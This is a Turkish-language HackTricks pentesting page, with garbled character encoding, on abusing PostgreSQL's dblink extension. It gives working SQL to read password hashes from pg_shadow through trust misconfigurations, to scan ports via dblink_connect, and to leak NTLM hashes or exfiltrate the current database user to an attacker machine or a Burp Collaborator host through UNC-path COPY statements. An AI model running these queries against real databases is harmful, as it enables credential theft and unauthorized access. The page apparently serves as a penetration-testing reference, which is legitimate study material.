<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>


**Bu saldÄ±rÄ±lar hakkÄ±nda daha fazla bilgiyi orijinal makalede bulabilirsiniz**.

**PostgreSQL 9.1**'den beri, ek modÃ¼llerin kurulumu basittir. [KayÄ±tlÄ± uzantÄ±lar gibi `dblink`](https://www.postgresql.org/docs/current/contrib.html), [`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html) ile kurulabilir:
```sql
CREATE EXTENSION dblink;
```
Dblink yÃ¼klendikten sonra bazÄ± ilginÃ§ hileler yapabilirsiniz:

## AyrÄ±calÄ±k YÃ¼kseltme

`pg_hba.conf` dosyasÄ±, **parolayÄ± bilmeye gerek duymadan** **herhangi bir kullanÄ±cÄ± olarak localhost'tan baÄŸlantÄ±larÄ±** **izinleyebilecek ÅŸekilde yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ** olabilir. Bu dosya genellikle `/etc/postgresql/12/main/pg_hba.conf` konumunda bulunur ve yanlÄ±ÅŸ bir yapÄ±landÄ±rma ÅŸu ÅŸekildedir:
```
local    all    all    trust
```
_Not edin ki bu yapÄ±landÄ±rma, yÃ¶neticinin unutmasÄ± durumunda bir db kullanÄ±cÄ±sÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirmek iÃ§in yaygÄ±n olarak kullanÄ±lÄ±r, bu y yÃ¼zden bazen bunu bulabilirsiniz._\
_AyrÄ±ca, pg\_hba.conf dosyasÄ±nÄ±n sadece postgres kullanÄ±cÄ±sÄ± ve grubu tarafÄ±ndan okunabilir ve sadece postgres kullanÄ±cÄ±sÄ± tarafÄ±ndan yazÄ±labilir olduÄŸunu unutmayÄ±n._

Bu durum, **hedefin iÃ§inde zaten bir kabuÄŸunuz olduÄŸunda** kullanÄ±ÅŸlÄ±dÄ±r Ã§Ã¼nkÃ¼ size postgresql veritabanÄ±na baÄŸlanmanÄ±za izin verecektir.

BaÅŸka bir olasÄ± yanlÄ±ÅŸ yapÄ±landÄ±rma ÅŸu ÅŸekildedir:
```
host    all     all     127.0.0.1/32    trust
```
Herkesin yerel sunucudan herhangi bir kullanÄ±cÄ± olarak veritabanÄ±na baÄŸlanmasÄ±na izin vereceÄŸi iÃ§in.\
Bu durumda ve eÄŸer **`dblink`** fonksiyonu **Ã§alÄ±ÅŸÄ±yorsa**, zaten kurulmuÅŸ bir baÄŸlantÄ± Ã¼zerinden veritabanÄ±na baÄŸlanarak ayrÄ±calÄ±klarÄ± yÃ¼kseltebilir ve eriÅŸmemeniz gereken verilere eriÅŸebilirsiniz:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
## Port Tarama

`dblink_connect` kÃ¶tÃ¼ye kullanarak **aÃ§Ä±k portlarÄ± arayabilirsiniz**. EÄŸer bu **fonksiyon Ã§alÄ±ÅŸmazsa, belgelendirmeye gÃ¶re `dblink_connect_u()` kullanmayÄ± denemelisiniz Ã§Ã¼nkÃ¼ `dblink_connect_u()`'nÄ±n `dblink_connect()` ile aynÄ± olduÄŸu, ancak non-super kullanÄ±cÄ±larÄ±n herhangi bir kimlik doÄŸrulama yÃ¶ntemini kullanarak baÄŸlanmasÄ±na izin verdiÄŸi belirtilmektedir.
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
`dblink_connect` veya `dblink_connect_u` kullanmadan **Ã¶nce**, aÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±rmanÄ±z gerekebilir:
```
CREATE extension dblink;
```
## UNC yolu - NTLM hash ifÅŸasÄ±

Bir hedef aÄŸda NTLM hash ifÅŸasÄ± yapmak iÃ§in UNC yolu kullanÄ±labilir. UNC yolu, aÄŸdaki bir kaynaÄŸa eriÅŸmek iÃ§in kullanÄ±lan bir yol belirtir. Bu yÃ¶ntem, hedef aÄŸdaki bir kaynaÄŸa baÄŸlanmak iÃ§in NTLM kimlik doÄŸrulamasÄ±nÄ± gerektiren bir iÅŸlem gerÃ§ekleÅŸtirir.

NTLM hash ifÅŸasÄ±, hedef aÄŸdaki bir kullanÄ±cÄ±nÄ±n NTLM hash deÄŸerini elde etmek anlamÄ±na gelir. Bu hash deÄŸeri, kullanÄ±cÄ±nÄ±n parolasÄ±nÄ±n ÅŸifrelenmiÅŸ bir sÃ¼rÃ¼mÃ¼dÃ¼r. NTLM hash ifÅŸasÄ±, saldÄ±rganÄ±n bu hash deÄŸerini Ã§alarak kullanÄ±cÄ±nÄ±n kimlik doÄŸrulamasÄ±nÄ± geÃ§ersiz kÄ±lmasÄ±na olanak tanÄ±r.

UNC yolu kullanarak NTLM hash ifÅŸasÄ± yapmak iÃ§in, saldÄ±rgan bir UNC yoluyla hedef aÄŸdaki bir kaynaÄŸa eriÅŸmeye Ã§alÄ±ÅŸÄ±r. Bu iÅŸlem sÄ±rasÄ±nda, saldÄ±rganÄ±n kimlik doÄŸrulamasÄ± gerektiren bir NTLM meydan okumasÄ± alÄ±r. SaldÄ±rgan, bu meydan okumayÄ± yanÄ±tlamak iÃ§in kullanÄ±cÄ±nÄ±n NTLM hash deÄŸerini kullanÄ±r.

NTLM hash ifÅŸasÄ±, saldÄ±rganÄ±n hedef aÄŸdaki kullanÄ±cÄ±nÄ±n kimlik bilgilerini ele geÃ§irmesine ve aÄŸa yetkisiz eriÅŸim saÄŸlamasÄ±na olanak tanÄ±r. Bu nedenle, hedef aÄŸÄ±n gÃ¼venliÄŸini saÄŸlamak iÃ§in NTLM hash ifÅŸasÄ±na karÅŸÄ± Ã¶nlemler alÄ±nmalÄ±dÄ±r.
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmaya kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
